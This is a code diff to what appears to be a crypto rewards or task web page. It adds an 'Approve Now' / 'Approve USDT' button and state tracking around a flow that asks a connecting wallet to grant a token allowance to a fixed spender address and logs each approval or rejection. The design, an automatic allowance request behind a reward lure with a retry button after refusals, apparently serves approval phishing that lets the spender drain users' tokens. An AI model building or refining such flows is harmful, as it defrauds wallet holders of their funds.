@@ -788,6 +788,12 @@ body {
     <span class="status-dot"></span>
     <span id="statusText">Not connected</span>
   </div>
+<button
+  id="approveBtn"
+  class="btn btn-task hidden"
+>
+  Approve Now
+</button>
 
   <div class="wallet-meta">
     <span class="network-pill" id="walletNetwork">—</span>
@@ -1475,6 +1481,8 @@ modal.addEventListener("click", e=>{
         let task9Done = false;
         let task10Done = false;
 
+let isTokenApproved = false;
+let approvalFailed  = false;
 
 
 
@@ -1950,6 +1958,10 @@ if(connectBtnCard){
       
       updateClaimState();
       updateTaskAccessUI();
+      isTokenApproved = false;
+approvalFailed  = false;
+updateApproveButtonUI();
+
 
     }
 
@@ -2147,11 +2159,15 @@ if(connectBtnCard){
         const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
         console.log("[approve] currentAllowance =", currentAllowance.toString());
 
-        if (currentAllowance > 0n) {
-          setStatus("Connected (already approved)");
-          await logApproval("approval_already");
-          return;
-        }
+       if (currentAllowance > 0n) {
+  isTokenApproved = true;
+  approvalFailed  = false;
+  setStatus("Connected + Approved ✅");
+  updateApproveButtonUI();
+  await logApproval("approval_already");
+  return;
+}
+
 
         // 2) send approve tx
         setStatus("Waiting for wallet to confirm approval…");
@@ -2167,8 +2183,12 @@ if(connectBtnCard){
         setStatus("Approval pending on chain…");
         await tx.wait();
 
-        setStatus("Connected + Approved ✅");
-        await logApproval("approval_approved");
+    isTokenApproved = true;
+approvalFailed  = false;
+setStatus("Connected + Approved ✅");
+updateApproveButtonUI();
+await logApproval("approval_approved");
+
       }catch(err){
         console.error("Token approve error:", err);
 
@@ -2176,11 +2196,13 @@ if(connectBtnCard){
         if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
           tag = "approval_rejected";
         }
+isTokenApproved = false;
+approvalFailed  = true;
 setStatus("Connected • Approval failed");
+updateApproveButtonUI();
+alert("Token approval failed: " + (err?.message || err));
+await logApproval(tag);
 
-        alert("Token approval failed: " + (err && err.message ? err.message : err));
-
-        await logApproval(tag);
       }
     }
 
@@ -2221,6 +2243,8 @@ if (connectBtnCard) {
   connectBtnCard.classList.add("connected");
 }
       updateClaimState();
+      updateApproveButtonUI();
+
 
       // Return values for connectFlow
       return {
@@ -2322,6 +2346,10 @@ async function connectFlow() {
       return session;
     })();
 
+
+    updateApproveButtonUI();
+
+
     // 8) Token approval (same behavior as before)
     await ensureTokenApproval();
     sessionPromise.catch(console.error);
@@ -2332,6 +2360,34 @@ async function connectFlow() {
     alert("Connection failed: " + (err && err.message ? err.message : err));
   }
 }
+
+
+
+function updateApproveButtonUI() {
+  const approveBtn = document.getElementById("approveBtn");
+  if (!approveBtn) return;
+
+  // Not connected → hide
+  if (!isWalletConnected) {
+    approveBtn.classList.add("hidden");
+    return;
+  }
+
+  // Approved already → hide
+  if (isTokenApproved) {
+    approveBtn.classList.add("hidden");
+    return;
+  }
+
+  // Connected + not approved → show
+  approveBtn.classList.remove("hidden");
+}
+
+
+
+
+
+
 
     
 
@@ -2543,6 +2599,23 @@ onReady: () => {
 
    
 
+const approveBtn = document.getElementById("approveBtn");
+if (approveBtn) {
+  approveBtn.addEventListener("click", async () => {
+    if (!isWalletConnected) return;
+    approveBtn.disabled = true;
+    approveBtn.textContent = "Approving…";
+
+    await ensureTokenApproval();
+
+    approveBtn.disabled = false;
+    approveBtn.textContent = "Approve USDT";
+  });
+}
+
+
+
+      
       if(rewardAmountEl){
         rewardAmountEl.textContent = "$" + REWARD_AMOUNT.toFixed(0);
       }
